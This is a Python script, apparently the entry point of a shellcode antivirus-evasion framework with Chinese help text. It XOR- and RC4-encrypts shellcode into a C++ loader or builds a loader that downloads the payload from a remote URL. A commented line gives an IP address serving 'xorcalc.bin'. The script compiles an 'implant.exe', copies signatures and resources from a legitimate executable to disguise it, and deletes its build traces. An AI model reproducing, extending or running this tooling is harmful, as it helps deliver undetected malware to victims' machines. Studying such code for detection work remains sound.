import argparse
import os
import re
from util import bin,encrypt,compile,bin2pic
from sign import sign
from time import sleep
from urllib.parse import urlparse


tempalte_arr = ['basic','dynamic','demo']

if __name__ == '__main__':
    banner = '''
      ╔╗  ╔╗   ╔══╗          ╔╗
      ║║ ╔╝╚╗  ║╔╗║          ║║
    ╔═╝╠═╩╗╔╬══╣╚╝╚╦═╦══╦╗╔╗╔╣║
    ║╔╗║╔╗║║║╔╗║╔═╗║╔╣╔╗║╚╝╚╝║║
    ║╚╝║╔╗║╚╣╔╗║╚═╝║║║╔╗╠╗╔╗╔╣╚╗  V1.0
    ╚══╩╝╚╩═╩╝╚╩═══╩╝╚╝╚╝╚╝╚╝╚═╝  By 360@cherno.x
    '''
    print(banner)
    parser = argparse.ArgumentParser(description="shellcode 免杀框架", formatter_class=argparse.RawDescriptionHelpFormatter)
    parser.add_argument('type', type=str, choices=["local", "remote"],help='选择本地免杀或分离免杀（分离效果更好，bin_filepath填写远程文件下载地址），使用分离免杀会默认指定template',default="local")
    parser.add_argument('bin_filepath', type=str, help='shellcode bin文件的地址')
    parser.add_argument('-c', type=int, help='处理加密bin文件',default=None)
    #parser.add_argument('-p', type=str, help='填写pic地址,生成混淆后的shellcode图片',default=None)
    parser.add_argument('-t', type=str, choices=tempalte_arr,help='选择使用的模板',default="basic")
    parser.add_argument('-a', type=int, choices=[32, 64],help='生成x64或x86位exe,默认为64位;',default=64)
    parser.add_argument('-i', type=str, help='来源证书和资源的exe',default=None)
    parser.add_argument('-o', type=str, help='输出结果,默认保存于项目根目录result.exe',default="..\\result.exe")
    args = parser.parse_args()


    
    bin_path = args.bin_filepath
    template_name = args.t
    payload_arch = args.a
    source_filepath = args.i
    result_filepath = args.o
    loader_type = args.type

    #进入分离免杀流程
    if (loader_type == "remote"):
        template_name = "remote"
        # shellcode混淆成图片
        if (args.c != None):
            print("[+] 正在处理bin文件")
            bin_path = args.bin_filepath
            bytes_array = bin.bin_to_bytes_array(bin_path)
            #对shellcode进行加密处理
            #xor
            xor_key = [0xbc,0xab,0xcb]
            bytes_array = encrypt.xor_encrypt_bytes(bytes_array,xor_key)
            with open("encrypt.bin","wb+") as f:
                f.write(bytes_array)
            # pic_path = args.p
            # bin2pic.genPic(bytes_array,pic_path)
            print("[+] 处理完成")
            exit()

        #提取URL内容
        #bin_path = "http://149.104.24.116/xorcalc.bin"
        parsed_url = urlparse(bin_path)
        scheme = parsed_url.scheme
        host = parsed_url.hostname
        port = str(parsed_url.port if parsed_url.port else (443 if scheme == "https" else 80))
        path = parsed_url.path
        #生成newloader
        print("[+] 正在生成new_loader.cpp")
        template_path = compile.switch_template(template_name)
        compile.new_loader_remote(template_path,host,port,path)
        

    #本地免杀流程
    elif (loader_type == "local"):    
        template_path = compile.switch_template(template_name)
        print(template_path)

        hex_array = bin.bin_to_hex_array(bin_path)

        #修改bin文件特征
        hex_array.insert(0, '0x90')
        
        #对数组进行加密处理
        #xor
        xor_key = ['0xbc', '0xab', '0xcb']
        hex_array = encrypt.xor_encrypt(hex_array,xor_key)
        #rc4
        rc4_key = os.urandom(16)
        ciphertext = encrypt.rc4enc(bytes(int(x, 16) for x in hex_array), rc4_key)

        #生成替换字符串
        #payload_str = "unsigned char payload[]  = {" + ", ".join(hex_array) + "};"
        RC4_key_text = 'unsigned char RC4key[] = { 0x' + ', 0x'.join(hex(x)[2:] for x in rc4_key) + ' };'
        payload_text = 'unsigned char payload[] = { 0x' + ', 0x'.join(hex(x)[2:] for x in ciphertext) + ' };'
    
        print("[+] 正在生成new_loader.cpp")
        compile.new_loader(template_path,payload_text,RC4_key_text)

    #进入编译流程    
    print("[+] 正在编译...")
    compiled_filepath = compile.compilefile(payload_arch,loader_type)
    if not os.path.exists("implant.exe"):
        print("[-] 编译失败")
        exit()
    if source_filepath == None:
        print("[-] 未指定签名和资源源文件,结果已生成于compile目录下")
        exit()

    #进入添加资源流程
    print("[+] 正在添加签名/资源")
    
    if os.path.exists(compiled_filepath):
        sign.callResHacker(compiled_filepath,source_filepath,result_filepath)
        #sign.callSigthief(compiled_filepath,source_filepath,result_filepath)
        print("[+] 已完成，结果生成于",os.getcwd(),"\\",result_filepath)
        print("[+] 正在删除过程文件...")
        try:
            sleep(3)
            #os.remove("temp.exe")
            os.remove("source.res")
            os.remove("..\\compile\\implant.exe")
            os.remove("..\\compile\\new_loader.cpp")
            print("[+] 删除完成")
        except:
            print("[-] 删除失败，请自行删除")
    else:
        print("[-]生成失败")
